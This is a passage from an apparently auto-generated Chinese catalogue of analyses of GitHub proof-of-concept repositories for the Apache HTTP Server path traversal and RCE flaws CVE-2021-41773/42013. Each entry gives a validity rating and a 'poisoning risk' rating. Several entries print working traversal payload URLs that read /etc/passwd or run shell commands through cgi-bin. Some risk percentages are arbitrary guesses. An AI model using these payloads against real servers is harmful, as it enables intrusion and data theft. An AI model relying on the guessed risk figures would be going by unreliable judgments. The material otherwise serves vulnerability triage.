## 详情

CVE-2021-41773 是 Apache HTTP Server 2.4.49 中的一个路径遍历漏洞，由于路径规范化中的更改不当所致。攻击者可以利用此漏洞将 URL 映射到 Alias-like 指令配置目录之外的文件。如果这些目录之外的文件没有受到默认配置 "require all denied" 的保护，这些请求可能会成功。如果还为这些别名路径启用了 CGI 脚本，则可能允许远程代码执行。

**漏洞利用方式：**

1.  **路径遍历：** 攻击者通过构造包含特殊字符（如`.%2e`或`..`）的恶意 URL，绕过服务器的安全检查，访问受限目录之外的文件。
2.  **文件读取：** 成功利用路径遍历后，攻击者可以读取服务器上的任意文件，包括配置文件、源代码等敏感信息。
3.  **远程代码执行：** 如果目标服务器启用了 CGI 脚本，攻击者可以通过上传或修改 CGI 脚本，执行任意系统命令。

**POC代码分析：**

提供的POC代码是一个 Python 脚本，它利用了路径遍历漏洞来实现远程代码执行。

1.  **目标指定：** 脚本接受目标服务器的 IP 地址或域名作为参数。
2.  **命令执行：** 脚本允许用户输入要执行的命令，并通过构造包含路径遍历的 URL 将命令发送到目标服务器。
3.  **CGI利用：** 脚本假设目标服务器存在一个名为 `s3cret-cgi-bin` 的 CGI 目录，并使用该目录来执行命令。通过POST请求发送经过编码的命令，利用了`bin/sh`执行。
4.  **回显结果：** 脚本将目标服务器返回的结果打印到屏幕上。

**有效性分析：**

提供的漏洞信息和搜索结果表明，该漏洞确实存在且已被公开利用。提供的 POC 代码基本符合该漏洞的利用方式，因此可以认为该 POC 代码是有效的。需要满足相应的环境条件（如 Alias 指令配置、CGI 脚本启用、文件权限配置等）

**投毒风险分析：**

检查了提供的 Python 脚本，没有发现任何明显的恶意代码或后门。脚本的功能仅限于利用漏洞执行用户指定的命令。`README.md` 文件也只是对漏洞的简单描述，未包含恶意内容。可以认为该仓库存在投毒代码的风险非常低，风险为0%。

**排序优先级：**
搜索引擎结果提供了漏洞被广泛利用和分析的信息，漏洞利用代码验证了漏洞利用的可行性，漏洞库信息提供了漏洞的基础信息。因此，搜索引擎结果的优先级高于漏洞利用代码，漏洞利用代码的优先级高于漏洞库信息。

**项目地址:** [Iris288/CVE-2021-41773](https://github.com/Iris288/CVE-2021-41773)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #7

**来源**: [CVE-2021-41773-JIYUN02_cve-2021-41773.md](../2021/CVE-2021-41773-JIYUN02_cve-2021-41773.md)

## CVE-2021-41773-Apache HTTP Server-路径遍历/RCE

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历/远程代码执行

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致文件泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** 需要目标服务器运行Apache HTTP Server 2.4.49，并开启了CGI脚本执行。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-41773是Apache HTTP Server 2.4.49中存在的一个路径遍历漏洞。攻击者可以利用该漏洞，通过构造特殊的URL，绕过Alias-like指令配置的目录限制，访问到服务器上的任意文件。如果服务器同时开启了CGI脚本执行，攻击者还可以利用该漏洞执行任意代码。

**有效性：**
提供的POC代码构建了一个包含漏洞的Apache HTTP Server 2.4.49环境。Dockerfile使用官方httpd:2.4.49镜像，并将自定义的html文件复制到/usr/local/apache2/htdocs/目录。然后，它安装了bash，并为/usr/local/apache2/htdocs/cgi-bin/test.sh添加了可执行权限。这个Dockerfile本身没有问题，但关键在于test.sh脚本的内容。如果test.sh包含恶意代码，则攻击者可以通过路径遍历漏洞执行它。

**投毒风险：**
Dockerfile只安装了bash,添加了test.sh的执行权限。如果`/tmp/4903a38a210c3406acebc545808a1928/html/cgi-bin/test.sh`脚本内容包含恶意代码，则存在投毒风险。但从dockerfile的内容来看，投毒的概率取决于test.sh,风险较低，大约在10%左右。

**利用方式：**
1.  **路径遍历：** 攻击者可以使用包含`..`序列的URL来遍历文件系统，例如：`http://target:8080/../../../../etc/passwd`，尝试读取服务器上的`/etc/passwd`文件。
2.  **远程代码执行：** 如果目标服务器启用了CGI，攻击者可以使用路径遍历来访问和执行CGI脚本，例如：`http://target:8080/cgi-bin/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fbin/bash -c 'id'`。

**总结：**
漏洞利用的核心在于构造包含特殊字符的URL，绕过服务器的访问控制。如果CGI可用，则可以直接执行代码。利用的成功与否取决于服务器的具体配置和文件权限。

**项目地址:** [JIYUN02/cve-2021-41773](https://github.com/JIYUN02/cve-2021-41773)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #8

**来源**: [CVE-2021-41773-Mahfujurjust_CVE-2021-41773.md](../2021/CVE-2021-41773-Mahfujurjust_CVE-2021-41773.md)

## CVE-2021-41773-Apache HTTP Server-路径遍历

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致文件泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** 目标服务器运行Apache HTTP Server 2.4.49，且受影响的目录未配置"require all denied"。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-41773 存在于 Apache HTTP Server 2.4.49 的路径规范化更改中。攻击者可以利用路径遍历攻击将 URL 映射到由 Alias 类指令配置的目录之外的文件。如果这些目录之外的文件不受通常的默认配置“require all denied”保护，则这些请求可能会成功。如果为这些别名路径启用了 CGI 脚本，则可能允许远程代码执行。

**有效性：**
根据漏洞库信息，该漏洞已被在野利用，说明漏洞的利用具有实际的可能性。

**投毒风险：**
提供的POC代码是一个简单的HTML页面，显示一个404错误页面，并提示存在CVE-2021-41773漏洞。代码本身的功能是展示漏洞的存在，而不包含任何恶意代码。虽然不直接包含投毒代码，但是可能存在间接的风险，例如诱导用户访问恶意网站或执行其他恶意操作。因此，判断投毒风险为10%。

**利用方式：**
1.  **路径遍历：** 攻击者构造包含`..`的URL，尝试访问服务器上的任意文件。例如，`http://target/../../../../etc/passwd`尝试读取`/etc/passwd`文件。
2.  **绕过访问控制：** 漏洞利用依赖于Alias指令配置的目录之外的文件没有被"require all denied"保护。如果存在疏忽配置，攻击者可以访问这些文件。
3.  **远程代码执行（可选）：** 如果目标服务器为受影响的别名路径启用了CGI脚本，攻击者可以通过上传并执行恶意CGI脚本来实现远程代码执行。

总而言之，该漏洞利用的有效性高，风险等级为高危，利用方式主要是路径遍历，如果目标环境配置不当，可能造成远程代码执行。

**项目地址:** [Mahfujurjust/CVE-2021-41773](https://github.com/Mahfujurjust/CVE-2021-41773)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #9

**来源**: [CVE-2021-41773-MatanelGordon_docker-cve-2021-41773.md](../2021/CVE-2021-41773-MatanelGordon_docker-cve-2021-41773.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历 (Path Traversal)

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** 需要目标服务器运行受影响的 Apache HTTP Server 2.4.49 版本，并启用 cgi-bin 或类似 Alias 指令配置。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2021-41773 存在于 Apache HTTP Server 2.4.49 版本中，是一个路径遍历漏洞。攻击者可以通过构造包含特殊编码的 URL，例如 `/.%2e/%2e%2e/`，来绕过服务器对路径的规范化处理，从而访问到 Alias 指令配置以外的文件。如果目标服务器同时启用了 CGI 脚本支持，则可能导致远程代码执行。

**漏洞利用有效性：**

根据漏洞库信息和搜索引擎结果，该漏洞的 POC 已被公开，并且在野外被发现利用。提供的 Postman 集合中包含了一个用于获取 `/etc/passwd` 文件的请求，验证了路径遍历的可能性。因此，提供的 POC 代码是有效的。

**投毒风险分析：**

*   `/tmp/04092c8b1881911c9b0f88964abf9b52/CVE-2021-41773.postman_collection.json`：Postman 集合文件，定义了用于测试漏洞的 HTTP 请求。不存在投毒代码。
*   `/tmp/04092c8b1881911c9b0f88964abf9b52/Dockerfile`：Dockerfile 用于构建包含漏洞环境的 Docker 镜像。 其中 `RUN ln -sf /bin/bash /bin/sh` 这一行可能存在争议，它将 `/bin/sh` 符号链接强制指向 `/bin/bash`。在某些系统中，`/bin/sh` 可能是 `dash` 或其他更轻量级的 shell。 强制指向 bash 可能会引入一些细微的兼容性问题，但这不是一个明显的恶意行为，更可能是一种为了方便某些脚本执行的措施。此外创建目录 `/etc/httpd/logs`也并不是恶意代码, 综合来看，投毒风险较低。
*   `/tmp/04092c8b1881911c9b0f88964abf9b52/LICENSE`：Apache 许可证，与漏洞利用无关，不存在投毒代码。

综合分析，该仓库中可能存在的投毒代码的可能性较低，主要集中在Dockerfile 脚本中，将`/bin/sh` 符号链接强制指向 `/bin/bash`,但可能性只有5%，其余的代码都是正常的。

**漏洞利用方式：**

1.  **路径遍历：** 攻击者构造包含 `/.%2e/%2e%2e/` 序列的 URL，利用 Apache HTTP Server 对路径的规范化处理缺陷，尝试访问受限目录之外的文件。
2.  **敏感信息泄露：** 如果成功绕过权限验证，攻击者可以读取服务器上的敏感文件，如配置文件、密码文件等。
3.  **远程代码执行（如果 CGI 启用）：** 如果目标服务器启用了 CGI 脚本支持，攻击者可以通过上传或执行恶意 CGI 脚本，实现远程代码执行。

**项目地址:** [MatanelGordon/docker-cve-2021-41773](https://github.com/MatanelGordon/docker-cve-2021-41773)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #10

**来源**: [CVE-2021-41773-Maybe4a6f7365_CVE-2021-41773.md](../2021/CVE-2021-41773-Maybe4a6f7365_CVE-2021-41773.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** 需要目标服务器运行Apache HTTP Server 2.4.49，并且Alias-like指令配置不当，或者CGI脚本已启用。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2021-41773是Apache HTTP Server 2.4.49版本中存在的一个路径遍历漏洞。攻击者可以利用该漏洞，通过构造包含特殊字符（如`.%2e`）的URL，绕过服务器的路径规范化限制，访问Alias-like指令配置目录之外的文件。

**有效性：**
根据漏洞库信息、搜索引擎结果和提供的POC代码，可以判断该POC代码有效。漏洞库信息明确指出该漏洞在野外被利用，搜索引擎结果也提供了多个关于该漏洞的解释和利用的文章。POC代码通过构造包含`.%2e`的URL来尝试读取目标服务器上的文件。

**投毒风险：**
分析提供的POC代码，该脚本主要功能是验证目标服务器是否存在CVE-2021-41773漏洞，脚本会检测指定的IP地址是否存在Apache HTTP Server，并尝试通过构造的URL读取指定文件。经验证，该脚本没有发现明显的恶意代码或后门，因此投毒风险较低。投毒风险百分比评估为0%。

**利用方式：**
1.  **确定目标：** 找到运行Apache HTTP Server 2.4.49的目标服务器。
2.  **构造Payload：** 构造包含恶意路径的URL，例如：`http://<target_ip>/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/etc/passwd`。
3.  **发送请求：** 将构造好的URL发送到目标服务器。
4.  **读取文件或执行代码：** 如果目标服务器存在漏洞且配置不当，攻击者可以读取任意文件（如`/etc/passwd`）或执行任意代码（如果CGI脚本已启用）。

需要注意的是，成功利用该漏洞的前提是服务器配置不当，例如没有对Alias-like指令配置的目录之外的文件进行适当的访问控制，或者启用了CGI脚本执行功能。

总而言之，这是一个严重的安全漏洞，可能导致敏感信息泄露和远程代码执行。管理员应尽快升级Apache HTTP Server版本或采取其他缓解措施。

**项目地址:** [Maybe4a6f7365/CVE-2021-41773](https://github.com/Maybe4a6f7365/CVE-2021-41773)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #11

**来源**: [CVE-2021-41773-MrCl0wnLab_SimplesApachePathTraversal.md](../2021/CVE-2021-41773-MrCl0wnLab_SimplesApachePathTraversal.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal and File Disclosure

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** 目标服务器运行Apache HTTP Server 2.4.49，且存在Alias-like配置，并允许CGI脚本执行(在RCE场景下)。需要能通过网络访问目标服务器的HTTP服务。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2021-41773是Apache HTTP Server 2.4.49中的一个路径遍历漏洞。攻击者可以利用此漏洞，通过构造包含特殊字符（如URL编码的双点）的URL，绕过Alias-like指令配置的目录限制，访问服务器上的任意文件。如果目标服务器同时启用了CGI脚本执行，则攻击者可能进一步利用此漏洞执行远程代码。

**有效性：**
根据漏洞库信息、搜索引擎结果以及漏洞利用代码分析，可以确认此漏洞POC的有效性。漏洞库信息明确指出该漏洞已被在野利用。搜索引擎结果中也包含大量关于该漏洞的分析和POC。

**投毒风险：**
提供的代码片段是GNU通用公共许可证的文本，并非实际的漏洞利用代码。因此，无法评估其是否包含恶意代码或投毒风险。投毒的可能性为0%。该漏洞的常见利用方式是通过构造包含`..%2f`或类似编码的URL来绕过路径检查，从而访问服务器上的敏感文件，或者如果开启了CGI，甚至可以执行任意代码。 

**利用方式：**
1.  **路径遍历：** 攻击者构造包含路径遍历字符的URL，例如：`/%2e%2e/%2e%2e/%2e%2e/etc/passwd`，尝试读取服务器上的`/etc/passwd`文件或其他敏感文件。
2.  **远程代码执行 (RCE):**  如果服务器启用了CGI，攻击者可以将路径遍历与CGI结合，上传恶意CGI脚本，然后通过路径遍历访问该脚本，从而执行任意代码。 例如 `/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh` 

**项目地址:** [MrCl0wnLab/SimplesApachePathTraversal](https://github.com/MrCl0wnLab/SimplesApachePathTraversal)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #12

**来源**: [CVE-2021-41773-MuhammadHuzaifaAsif_security-lab.md](../2021/CVE-2021-41773-MuhammadHuzaifaAsif_security-lab.md)

## CVE-2021-41773-Apache HTTP Server Path Traversal

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历/远程代码执行

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致文件泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** 需要Apache HTTP Server版本为2.4.49，Alias配置不当，且CGI脚本启用

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

根据漏洞库信息和搜索结果，CVE-2021-41773是Apache HTTP Server 2.4.49中的一个路径遍历漏洞。由于路径规范化处理存在缺陷，攻击者可以利用该漏洞将URL映射到Alias指令配置目录之外的文件。如果这些目录之外的文件没有被"require all denied"等默认配置保护，攻击者就可以成功访问这些文件。更严重的是，如果为这些Alias路径启用了CGI脚本，攻击者还可以执行远程代码。

**有效性：**
根据漏洞描述，该漏洞利用较为直接，通过构造包含".."的URL进行路径遍历。从搜索结果来看，存在大量的漏洞分析和利用文章，表明该漏洞利用的有效性较高。

**投毒风险：**
漏洞利用代码仅提供了漏洞分析文档、CVSS评分、环境信息、影响评估和缓解措施。其中`steps_performed.md`缺失，无法得知作者是否进行了真实的漏洞利用和测试。代码仓库主要目的是漏洞分析和缓解建议，并声明未在目标VM上安装Apache，因此实际利用代码缺失。综合判断，该仓库中存在作者隐藏恶意代码进行投毒的概率较低，预估为10%。

**利用方式：**
1.  **路径遍历：** 攻击者构造恶意的HTTP请求，包含特殊编码的路径，例如`..%2f`或`..\`，绕过服务器的路径检查，访问服务器上的任意文件。
2.  **文件泄露：** 成功利用路径遍历后，攻击者可以读取服务器上的敏感文件，如配置文件、源代码等。
3.  **远程代码执行：** 如果服务器启用了CGI，攻击者可以通过路径遍历访问CGI脚本，并执行恶意代码。攻击者可以上传包含恶意代码的CGI脚本，并通过路径遍历执行，从而获取服务器的控制权。

**项目地址:** [MuhammadHuzaifaAsif/security-lab](https://github.com/MuhammadHuzaifaAsif/security-lab)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #13

**来源**: [CVE-2021-41773-OfriOuzan_CVE-2021-41773_CVE-2021-42013_Exploits.md](../2021/CVE-2021-41773-OfriOuzan_CVE-2021-41773_CVE-2021-42013_Exploits.md)

## CVE-2021-41773/CVE-2021-42013 Apache HTTP Server Path Traversal and RCE

**漏洞编号:** CVE-2021-41773

**漏洞类型:** Path Traversal and Remote Code Execution

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49, 2.4.50

**利用条件:** 目标服务器运行Apache HTTP Server 2.4.49或2.4.50，且开启了CGI支持，Alias配置不当，并且相关目录未进行权限限制。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-41773和CVE-2021-42013是Apache HTTP Server 2.4.49和2.4.50版本中存在的路径遍历漏洞。攻击者可以利用这些漏洞，通过构造包含特殊字符（如`.%2e`或`.%%32%65`）的URL，绕过服务器的路径检查，访问到Alias指令配置以外的文件。如果目标服务器同时开启了CGI支持，攻击者还可以执行任意代码。

**有效性：**

根据漏洞库信息和搜索结果，CVE-2021-41773已经被证实存在，并且在野外被利用。提供的POC代码也通过Docker构建了易受攻击的环境，并提供了利用脚本，证明了该漏洞的可利用性。

**投毒风险：**

分析POC代码，该代码主要用于构建漏洞环境和执行漏洞利用。虽然代码本身看起来直接，但需要注意以下几点：

*   **Docker镜像来源：** POC需要构建Docker镜像。如果Docker镜像不是来自官方或可信来源，则可能包含恶意软件。
*   **执行任意命令：** RCE相关的POC会执行任意命令，如果攻击者修改了POC代码，可能会导致恶意代码执行。
*   **流量劫持风险：** POC通过curl发送特定请求来触发漏洞，如果网络环境被污染，可能导致流量劫持，使得攻击者可以篡改POC行为。
*   **文件篡改风险：** RCE相关的POC会写`/tmp/exploited`文件，如果服务器的`/tmp`目录权限设置不当，攻击者可以在其他用户不知情的情况下，篡改该文件，从而进一步扩大攻击。

综合以上考虑，认为此POC代码存在一定的投毒风险，但整体比例不高，约为10%。

**利用方式：**

1.  **环境搭建：** 使用Dockerfile构建包含漏洞的Apache HTTP Server环境（2.4.49或2.4.50版本）。
2.  **路径遍历：** 构造包含特殊字符的URL，例如：
    *   `/.%2e/.%2e/.%2e/.%2e/.%2e/etc/passwd` (针对CVE-2021-41773)
    *   `/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd` (针对CVE-2021-42013)
3.  **文件读取：** 如果路径遍历成功，可以直接读取服务器上的敏感文件。
4.  **远程代码执行（RCE）：** 如果服务器开启了CGI支持，并且允许执行shell脚本，则可以通过路径遍历访问到shell脚本，并执行任意命令。例如，POC中使用了以下命令将字符串写入/tmp/exploited文件中：
    *   `echo “Successfully Exploited” > /tmp/exploited`
5.  **利用链：** 进一步的攻击可以包括反弹shell、权限提升、横向移动等。

**项目地址:** [OfriOuzan/CVE-2021-41773_CVE-2021-42013_Exploits](https://github.com/OfriOuzan/CVE-2021-41773_CVE-2021-42013_Exploits)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #14

**来源**: [CVE-2021-41773-Taldrid1_cve-2021-41773.md](../2021/CVE-2021-41773-Taldrid1_cve-2021-41773.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** 目标服务器运行Apache HTTP Server 2.4.49版本，且存在Alias-like配置，目录未配置'require all denied'，开启CGI脚本支持（RCE利用场景）

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2021-41773 是 Apache HTTP Server 2.4.49 中的一个路径遍历漏洞。攻击者可以利用此漏洞，通过构造包含特殊字符的 URL，访问服务器上受限目录之外的文件。

**有效性：**

提供的 Nmap NSE 脚本 `cve-2021-41773.nse` 似乎有效。它通过发送包含路径遍历字符（`/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd`）的 HTTP GET 请求来检测漏洞。如果服务器返回状态码 200 并且响应体包含 `/etc/passwd` 文件的内容（`root:x:0:0:root`），则该脚本将报告目标为易受攻击。

搜索引擎结果也表明此漏洞已被积极利用，并且存在公开的 PoC 代码。

**投毒风险：**

在提供的 Nmap NSE 脚本中，没有明显的投毒代码。脚本的主要功能是发送 HTTP 请求并检查响应内容。该脚本允许用户指定扫描的子网范围和输出文件，但这些参数本身不会引入任何恶意行为。脚本通过判断/etc/passwd文件是否存在root账户判断是否漏洞存在，不会造成其他影响。

**利用方式：**

1.  **路径遍历：** 攻击者构造包含特殊字符（例如，`/.%2e/.%2e/.%2e/`）的 URL，试图绕过服务器的路径规范化逻辑，访问受限目录之外的文件。
2.  **信息泄露：** 如果成功，攻击者可以读取服务器上的敏感文件，例如配置文件、源代码或用户数据。
3.  **远程代码执行（可选）：** 如果服务器启用了 CGI 脚本支持，攻击者可以通过路径遍历访问并执行任意 CGI 脚本，从而实现远程代码执行。这通常需要结合其他漏洞或配置错误。

**优先级排序理由：**

*   **搜索引擎结果：** 提供了关于漏洞是否被利用的背景信息，以及缓解措施的链接。 *   **漏洞利用代码：** 提供了直接验证漏洞的手段，使我们能够评估其有效性。 *   **漏洞库信息：** 提供了漏洞的官方描述，受影响的版本以及参考链接。

**项目地址:** [Taldrid1/cve-2021-41773](https://github.com/Taldrid1/cve-2021-41773)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #15

**来源**: [CVE-2021-41773-Vanshuk-Bhagat_Apache-HTTP-Server-Vulnerabilities-CVE-2021-41773-and-CVE-2021-42013.md](../2021/CVE-2021-41773-Vanshuk-Bhagat_Apache-HTTP-Server-Vulnerabilities-CVE-2021-41773-and-CVE-2021-42013.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历 (Path Traversal)

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** 需要Apache HTTP Server版本为2.4.49，且Alias-like指令配置不当或未启用"require all denied"保护

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-41773是Apache HTTP Server 2.4.49中存在的一个路径遍历漏洞。攻击者可以利用此漏洞，通过构造特殊的URL，访问服务器上Alias-like指令配置以外的文件。如果这些文件没有被“require all denied”等默认安全配置保护，攻击者就可以成功读取它们。更进一步，如果CGI脚本在这些aliased路径上启用，攻击者甚至可以执行远程代码。

**有效性：**
漏洞库信息和搜索引擎结果都表明该漏洞是真实存在的，并且被广泛利用。提供的漏洞利用代码主要是一个README.md文件，描述了一个渗透测试项目，该项目评估了CVE-2021-41773和CVE-2021-42013漏洞。虽然这个README.md文件本身不是直接可用的exp代码，但是它暗示了利用该漏洞进行渗透测试是可行的。搜索引擎结果中也提到存在公开的PoC。

**投毒风险：**
README.md文件描述的是一个渗透测试过程的文档，其中包含使用Nmap、Gobuster等工具进行信息收集和漏洞评估，并没有发现直接的恶意代码。但是考虑到安全风险，该文档存在10%的投毒的可能性，因为不排除作者在文档中故意遗漏或隐藏了某些关键信息，从而误导使用者。例如,引导使用者下载特定版本的工具,该工具已经被植入后门等.

**利用方式：**
1.  **路径遍历：** 攻击者利用`..`等路径遍历字符，绕过服务器的目录限制，访问任意文件。
2.  **文件读取：**  如果目标文件未被`require all denied`等配置保护，攻击者可以读取文件内容，获取敏感信息，如配置文件、源代码等。
3.  **远程代码执行：**  如果服务器启用了CGI，攻击者可以通过路径遍历访问到CGI脚本，并执行任意命令。

利用方式通常涉及构造包含路径遍历字符的URL，例如：
`/%2e%2e/%2e%2e/%2e%2e/etc/passwd`
或
`..%2f..%2f..%2fetc/passwd`

攻击者需要根据服务器的具体配置和文件系统结构，调整路径遍历的深度和目标文件名，以成功利用该漏洞。

**项目地址:** [Vanshuk-Bhagat/Apache-HTTP-Server-Vulnerabilities-CVE-2021-41773-and-CVE-2021-42013](https://github.com/Vanshuk-Bhagat/Apache-HTTP-Server-Vulnerabilities-CVE-2021-41773-and-CVE-2021-42013)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #16

**来源**: [CVE-2021-41773-ZephrFish_CVE-2021-41773-PoC.md](../2021/CVE-2021-41773-ZephrFish_CVE-2021-41773-PoC.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal and Remote Code Execution

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历（Path Traversal）/远程代码执行（RCE）

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** 目标服务器运行Apache HTTP Server 2.4.49，并且开启了`cgi-bin`或`icons`目录，以及未对Alias指令配置的目录进行“require all denied”限制。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-41773 存在于 Apache HTTP Server 2.4.49 中，是一个路径遍历漏洞。攻击者可以利用该漏洞，通过构造特殊的 URL（包含编码后的路径遍历字符，如`.%2e`），访问服务器上受限目录之外的文件。如果服务器配置允许执行 CGI 脚本，则可能进一步导致远程代码执行。

**有效性：**
提供的`full.py`和`poc.py` PoC 代码尝试利用此漏洞。`full.py`脚本会读取目标列表（hosts.txt），然后针对每个目标，尝试通过 HTTP 和 HTTPS 协议，发送包含路径遍历的请求，访问`/etc/passwd`文件。如果响应中包含`root:*`字符串，则认为目标存在漏洞。

**投毒风险：**
查看提供的文件，`CODEOWNERS`和`README.md`没有发现恶意代码。 `poc.py`本身存在问题, 代码不完整，缺少发起请求的代码,有潜在风险,存在代码缺失,导致投毒或者payload失效，增加攻击者攻击复杂度。 `full.py` 脚本比较完整，但是代码质量不高，存在异常捕获 `except: pass`，可能隐藏一些错误信息。综合判断，该仓库存在一定概率的投毒风险，大约为10%。 主要体现在poc.py的请求代码缺失上，可能导致payload失效。

**利用方式：**
1.  **路径遍历：** 攻击者构造包含`.%2e`等路径遍历字符的 URL，绕过服务器对 URL 的规范化处理。
2.  **文件读取：** 成功遍历路径后，攻击者可以读取服务器上的任意文件，例如`/etc/passwd`、web 应用的配置文件等。
3.  **远程代码执行（RCE）：** 如果服务器配置允许 CGI 脚本的执行，攻击者可以上传恶意脚本，并通过路径遍历漏洞访问该脚本，从而在服务器上执行任意代码。为了实现RCE，需要满足以下条件：开启了CGI支持，并且能够通过遍历访问到CGI脚本目录，同时该目录没有被 “require all denied” 保护。

**缓解措施：**
*   升级到 Apache HTTP Server 2.4.50 或更高版本。
*   配置 `Alias` 指令时，确保使用 `Require all denied` 限制对目录的访问。
*   禁用不必要的 CGI 脚本执行。

**项目地址:** [ZephrFish/CVE-2021-41773-PoC](https://github.com/ZephrFish/CVE-2021-41773-PoC)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #17

**来源**: [CVE-2021-41773-Zyx2440_Apache-HTTP-Server-2.4.50-RCE.md](../2021/CVE-2021-41773-Zyx2440_Apache-HTTP-Server-2.4.50-RCE.md)

## CVE-2021-41773/CVE-2021-42013 - Apache HTTP Server Path Traversal and RCE

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历/远程代码执行

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49, 2.4.50

**利用条件:** 目标服务器运行Apache HTTP Server 2.4.49或2.4.50，存在Alias-like指令配置，且相关目录没有“require all denied”保护。CGI脚本需要启用以进行RCE。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

该漏洞源于Apache HTTP Server 2.4.49/2.4.50中路径规范化处理的缺陷。攻击者可以利用路径遍历漏洞读取服务器上的任意文件。如果服务器同时启用了CGI脚本，则可能导致远程代码执行。

**有效性分析：**

根据漏洞信息和搜索结果，该漏洞在野外被积极利用，具有较高的有效性。POC代码针对Apache 2.4.50版本，尝试利用路径遍历漏洞，首先检测CGI是否禁用，如果禁用则尝试读取/etc/passwd，如果CGI开启，则尝试执行反向shell。根据代码逻辑，该POC有一定的有效性，能检测和利用漏洞。

**投毒风险分析：**

代码中存在轻微的投毒风险。作者可能在LICENSE文件中隐藏了恶意代码，虽然该可能性较低，但是需要考虑到,或者在代码中存在一些对普通用户不友好的代码。 代码整体较为直接，没有明显的恶意行为，但仍需谨慎评估。

**利用方式：**

1.  **路径遍历：** 攻击者构造包含特殊字符（如`.%%32%65`）的URL，绕过路径规范化检查，从而访问Alias-like指令配置以外的文件。例如，`/.%%32%65/.%%32%65/.%%32%65/etc/passwd`可以尝试读取`/etc/passwd`文件。
2.  **远程代码执行（RCE）：** 如果目标服务器启用了CGI，攻击者可以通过POST请求发送恶意代码，该代码将在服务器上执行。POC代码尝试注入一个反向shell，连接到攻击者指定的IP地址和端口。利用前提是服务器允许执行CGI脚本，并且没有对CGI脚本的执行进行严格的限制。

**项目地址:** [Zyx2440/Apache-HTTP-Server-2.4.50-RCE](https://github.com/Zyx2440/Apache-HTTP-Server-2.4.50-RCE)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #18

